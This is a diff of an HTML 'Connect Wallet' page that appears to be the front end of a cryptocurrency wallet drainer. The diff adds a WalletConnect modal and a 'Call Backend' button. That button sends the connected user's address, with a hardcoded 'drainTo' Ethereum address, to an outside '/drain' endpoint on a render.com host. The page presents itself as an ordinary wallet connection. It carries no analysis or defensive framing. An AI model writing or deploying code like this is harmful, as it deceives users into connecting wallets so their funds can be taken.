@@ -2,109 +2,184 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Connect Wallet</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wallet Connect</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
 
-  <!-- WalletConnect Universal Provider -->
-  <script src="https://unpkg.com/@walletconnect/universal-provider@2.15.1/dist/index.umd.js"></script>
+  <!-- WalletConnect Modal (UI) -->
+  <script src="https://unpkg.com/@walletconnect/modal@2.7.1/dist/index.umd.js"></script>
 
-  <!-- Ethers (lightweight, stable) -->
+  <!-- WalletConnect Ethereum Provider -->
+  <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.15.1/dist/index.umd.js"></script>
+
+  <!-- Ethers -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js"></script>
 
   <style>
     body {
-      background: #0f172a;
-      color: white;
-      font-family: system-ui, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
+      background:#020617;
+      color:white;
+      font-family:system-ui;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      min-height:100vh;
     }
     .card {
-      background: #020617;
-      padding: 24px;
-      border-radius: 12px;
-      width: 100%;
-      max-width: 380px;
-      text-align: center;
-      box-shadow: 0 10px 30px rgba(0,0,0,.5);
+      background:#020617;
+      border:1px solid #1e293b;
+      padding:24px;
+      border-radius:14px;
+      width:100%;
+      max-width:420px;
+      text-align:center;
     }
     button {
-      width: 100%;
-      padding: 14px;
-      border-radius: 8px;
-      border: none;
-      font-size: 16px;
-      font-weight: 600;
-      background: #22c55e;
-      color: black;
-      cursor: pointer;
+      width:100%;
+      padding:14px;
+      margin-top:10px;
+      border-radius:10px;
+      border:none;
+      font-weight:600;
+      cursor:pointer;
     }
-    button:disabled {
-      background: #475569;
-      cursor: not-allowed;
+    .primary { background:#22c55e; color:black; }
+    .danger { background:#ef4444; color:white; }
+    .spinner {
+      display:none;
+      margin:12px auto;
+      width:24px;
+      height:24px;
+      border:3px solid #334155;
+      border-top:3px solid white;
+      border-radius:50%;
+      animation:spin 1s linear infinite;
     }
-    .address {
-      margin-top: 16px;
-      word-break: break-all;
-      font-size: 14px;
-      color: #94a3b8;
+    @keyframes spin { to { transform:rotate(360deg); } }
+    pre {
+      margin-top:12px;
+      background:#020617;
+      padding:12px;
+      border-radius:10px;
+      font-size:13px;
+      text-align:left;
+      overflow:auto;
     }
   </style>
 </head>
 <body>
 
-  <div class="card">
-    <h2>Connect Wallet</h2>
-    <p style="color:#94a3b8">WalletConnect compatible</p>
+<div class="card">
+  <h2>Connect Wallet</h2>
+  <p style="color:#94a3b8">WalletConnect compatible</p>
 
-    <button id="connectBtn">Connect Wallet</button>
+  <div class="spinner" id="spinner"></div>
 
-    <div id="address" class="address"></div>
-  </div>
+  <button id="connectBtn" class="primary">Connect Wallet</button>
+  <button id="disconnectBtn" class="danger" style="display:none">Disconnect</button>
 
-  <script>
-    const connectBtn = document.getElementById("connectBtn");
-    const addressDiv = document.getElementById("address");
+  <p id="address" style="margin-top:12px;color:#94a3b8"></p>
 
-    let provider;
+  <button id="callApiBtn" style="display:none" class="primary">
+    Call Backend
+  </button>
 
-    connectBtn.onclick = async () => {
-      try {
-        connectBtn.disabled = true;
-        connectBtn.innerText = "Connecting...";
+  <pre id="response"></pre>
+</div>
 
-        provider = await window.WalletConnectUniversalProvider.UniversalProvider.init({
-          projectId: "962425907914a3e80a7d8e7288b23f62", // YOUR WC PROJECT ID
-          chains: ["eip155:1"], // Ethereum Mainnet
-          methods: ["eth_requestAccounts", "personal_sign"],
-          events: ["accountsChanged", "chainChanged"],
-          metadata: {
-            name: "WalletConnect Demo",
-            description: "Simple wallet connection",
-            url: window.location.origin,
-            icons: ["https://walletconnect.com/walletconnect-logo.png"]
-          }
-        });
+<script>
+  const projectId = "962425907914a3e80a7d8e7288b23f62";
 
-        await provider.connect();
+  const spinner = document.getElementById("spinner");
+  const connectBtn = document.getElementById("connectBtn");
+  const disconnectBtn = document.getElementById("disconnectBtn");
+  const callApiBtn = document.getElementById("callApiBtn");
+  const addressEl = document.getElementById("address");
+  const responseEl = document.getElementById("response");
 
-        const ethersProvider = new ethers.BrowserProvider(provider);
-        const signer = await ethersProvider.getSigner();
-        const address = await signer.getAddress();
+  let provider, ethersProvider, signer, address;
 
-        addressDiv.innerText = `Connected:\n${address}`;
-        connectBtn.innerText = "Wallet Connected";
+  const modal = new window.WalletConnectModal({
+    projectId,
+    chains: [1, 11155111], // Mainnet + Sepolia
+    themeMode: "dark"
+  });
 
-      } catch (err) {
-        console.error(err);
-        alert("Connection failed");
-        connectBtn.disabled = false;
-        connectBtn.innerText = "Connect Wallet";
-      }
-    };
-  </script>
+  async function connectWallet() {
+    try {
+      spinner.style.display = "block";
+
+      provider = await window.EthereumProvider.init({
+        projectId,
+        chains: [1, 11155111],
+        showQrModal: false
+      });
+
+      modal.subscribeModal((state) => {
+        if (state.open) modal.openModal();
+      });
+
+      await provider.connect();
+
+      ethersProvider = new ethers.BrowserProvider(provider);
+      signer = await ethersProvider.getSigner();
+      address = await signer.getAddress();
+
+      addressEl.textContent = `Connected: ${address}`;
+
+      connectBtn.style.display = "none";
+      disconnectBtn.style.display = "block";
+      callApiBtn.style.display = "block";
+    } catch (e) {
+      alert("Wallet connection failed");
+      console.error(e);
+    } finally {
+      spinner.style.display = "none";
+    }
+  }
+
+  async function disconnectWallet() {
+    await provider.disconnect();
+    address = null;
+    addressEl.textContent = "";
+    responseEl.textContent = "";
+    connectBtn.style.display = "block";
+    disconnectBtn.style.display = "none";
+    callApiBtn.style.display = "none";
+  }
+
+  async function callBackend() {
+    try {
+      spinner.style.display = "block";
+      responseEl.textContent = "";
+
+      const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          address,
+          drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4"
+        })
+      });
+
+      const data = await res.json();
+
+      responseEl.textContent = JSON.stringify({
+        success: res.ok,
+        message: res.ok ? "Request successful" : "Request failed",
+        data
+      }, null, 2);
+
+    } catch (e) {
+      responseEl.textContent = "Backend request failed";
+    } finally {
+      spinner.style.display = "none";
+    }
+  }
+
+  connectBtn.onclick = connectWallet;
+  disconnectBtn.onclick = disconnectWallet;
+  callApiBtn.onclick = callBackend;
+</script>
 
 </body>
 </html>
